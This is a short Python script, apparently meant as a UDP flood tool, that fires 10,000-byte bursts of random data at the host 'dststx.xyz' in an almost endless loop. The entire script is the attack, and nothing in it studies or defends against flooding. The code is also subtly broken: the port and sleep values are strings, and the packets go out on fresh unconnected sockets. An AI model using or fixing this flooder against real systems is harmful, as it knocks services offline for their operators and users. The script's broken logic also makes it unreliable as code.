import socket, random, time

sleep = "0.05"

socket.socket(socket.AF_INET, socket.SOCK_DGRAM).connect(("dststx.xyz", "80"))

for i in range(1, 100**1000):
    socket.socket(socket.AF_INET, socket.SOCK_DGRAM).send(random._urandom(10)*1000)
    print(f"Send: {i}", end='\r')
    time.sleep(sleep)
    
